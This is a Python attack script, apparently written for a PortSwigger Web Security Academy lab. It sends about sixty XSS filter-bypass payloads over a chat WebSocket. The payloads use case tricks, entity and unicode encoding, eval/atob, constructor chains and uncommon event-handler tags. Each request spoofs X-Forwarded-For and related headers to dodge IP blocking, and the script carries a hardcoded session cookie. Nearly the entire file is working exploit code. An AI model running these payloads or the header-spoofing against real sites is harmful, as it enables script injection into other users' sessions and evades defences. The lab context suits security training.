#!/usr/bin/env python3
import asyncio
import websockets
import random
import base64
import json

class XSSFilterBypass:
    def __init__(self, target_url):
        self.target_url = target_url
        self.ip_counter = 1
        
    def get_random_ip(self):
        """Generate a new IP for each attempt to avoid blocking"""
        self.ip_counter += 1
        return f"192.168.{random.randint(1,254)}.{self.ip_counter}"
    
    def get_bypass_payloads(self):
        """Advanced XSS payloads to bypass filters"""
        return [
            # Case variations
            "<IMG SRC=1 OnErRoR='alert(1)'>",
            "<iMg SrC=1 oNeRrOr='alert(1)'>",
            
            # Without quotes
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<img src=x onerror=alert(/XSS/)>",
            
            # Tab/newline injection
            "<img\tsrc=1\tonerror='alert(1)'>",
            "<img\nsrc=1\nonerror='alert(1)'>",
            "<img\rsrc=1\ronerror='alert(1)'>",
            
            # Slash variations
            "<img/src=1/onerror='alert(1)'>",
            "<img//src=1//onerror='alert(1)'>",
            
            # HTML entities
            "<img src=1 onerror='alert&lpar;1&rpar;'>",
            "<img src=1 onerror='&\#97;lert(1)'>",
            
            # Unicode escapes
            "<img src=1 onerror='\\u0061lert(1)'>",
            "<img src=1 onerror='\\x61lert(1)'>",
            
            # Alternative execution
            "<img src=1 onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "<img src=1 onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
            "<img src=1 onerror='window[\"al\"+\"ert\"](1)'>",
            "<img src=1 onerror='window[\"\\x61\\x6c\\x65\\x72\\x74\"](1)'>",
            "<img src=1 onerror='top[\"al\"+\"ert\"](1)'>",
            "<img src=1 onerror='self[\"al\"+\"ert\"](1)'>",
            "<img src=1 onerror='parent[\"al\"+\"ert\"](1)'>",
            
            # Using backticks
            "<img src=1 onerror=`alert(1)`>",
            "<img src=1 onerror=`alert\`1\``>",
            
            # SVG vectors
            "<svg onload='alert(1)'>",
            "<svg/onload='alert(1)'>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><script>alert`1`</script></svg>",
            
            # Less common tags
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<details open ontoggle='alert(1)'>",
            "<select autofocus onfocus='alert(1)'>",
            "<textarea autofocus onfocus='alert(1)'>",
            "<keygen autofocus onfocus='alert(1)'>",
            "<video><source onerror='alert(1)'>",
            "<audio src=x onerror='alert(1)'>",
            "<marquee onstart='alert(1)'>",
            
            # Data URLs
            "<object data='data:text/html,<script>alert(1)</script>'>",
            "<embed src='data:text/html,<script>alert(1)</script>'>",
            
            # JavaScript URL encoding
            "<img src='javascri\\x70t:alert(1)'>",
            "<img src='java\\tscript:alert(1)'>",
            "<img src='java\\nscript:alert(1)'>",
            "<img src='java\\rscript:alert(1)'>",
            
            # Double encoding
            "<img src=1 onerror='\\\\u0061lert(1)'>",
            
            # Null bytes
            "<img src=1 onerror='alert\\x00(1)'>",
            
            # Constructor bypass
            "<img src=1 onerror='constructor.constructor(\"alert(1)\")()\'>",
            "<img src=1 onerror='[].map.constructor(\"alert(1)\")()\'>",
            
            # Without parentheses
            "<img src=1 onerror='alert`1`'>",
            "<img src=1 onerror='throw alert`1`'>",
            "<img src=1 onerror='onerror=alert;throw 1'>",
            
            # Using setTimeout/setInterval
            "<img src=1 onerror='setTimeout(alert,0,1)'>",
            "<img src=1 onerror='setInterval(alert,0,1)'>",
            
            # Import bypass
            "<img src=1 onerror='import(\"data:text/javascript,alert(1)\")'>",
            
            # Template literals
            "<img src=1 onerror='alert`${1}`'>",
            
            # Arrow functions
            "<img src=1 onerror='(()=>alert(1))()'>",
            
            # Eval alternatives
            "<img src=1 onerror='Function(\"alert(1)\")()\'>",
            "<img src=1 onerror='new Function(\"alert(1)\")()\'>",
        ]
    
    async def test_payload(self, payload):
        """Test a single payload with IP rotation"""
        spoofed_ip = self.get_random_ip()
        headers = {
            'X-Forwarded-For': spoofed_ip,
            'X-Real-IP': spoofed_ip,
            'X-Originating-IP': spoofed_ip,
            'X-Remote-IP': spoofed_ip,
            'X-Client-IP': spoofed_ip,
            'True-Client-IP': spoofed_ip,
            'Cookie': 'session=2HQSLLJZkjvQo1iCKN32guMIwjRZMEBe',
            'Origin': 'https://0a9f00fb048cba34808035000032001d.web-security-academy.net',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        }
        
        try:
            async with websockets.connect(self.target_url, extra_headers=headers) as websocket:
                print(f"[*] Testing with IP {spoofed_ip}: {payload[:50]}...")
                
                # Send payload
                message = json.dumps({"message": payload})
                await websocket.send(message)
                
                # Check response
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=2)
                    
                    # Check if payload was reflected
                    if any(indicator in response for indicator in ['alert', 'script', payload[:20]]):
                        print(f"[!!!] POTENTIAL XSS with: {payload}")
                        print(f"     Using IP: {spoofed_ip}")
                        return True
                    else:
                        print(f"[-] Filtered: {payload[:30]}...")
                        
                except asyncio.TimeoutError:
                    print(f"[!] Timeout (might be blocked)")
                    
        except websockets.exceptions.ConnectionClosed:
            print(f"[!] Connection closed (filter triggered)")
        except Exception as e:
            print(f"[!] Error: {str(e)[:50]}")
        
        return False

async def main():
    # Your specific WebSocket URL
    target = "wss://0a9f00fb048cba34808035000032001d.web-security-academy.net/chat"
    
    bypasser = XSSFilterBypass(target)
    payloads = bypasser.get_bypass_payloads()
    
    print(f"[*] Testing {len(payloads)} bypass payloads with IP rotation...")
    print("-" * 60)
    
    successful = []
    for payload in payloads:
        success = await bypasser.test_payload(payload)
        if success:
            successful.append(payload)
        
        # Delay to avoid rate limiting
        await asyncio.sleep(1)
    
    print("-" * 60)
    if successful:
        print(f"\n[+] Successful bypasses found: {len(successful)}")
        for p in successful:
            print(f"    {p}")
    else:
        print("\n[-] No bypasses found. The filter might be very strict.")
        print("[*] Try:")
        print("    1. Polyglot payloads")
        print("    2. DOM-based XSS instead")
        print("    3. Other injection points (headers, etc.)")

if __name__ == "__main__":
    asyncio.run(main())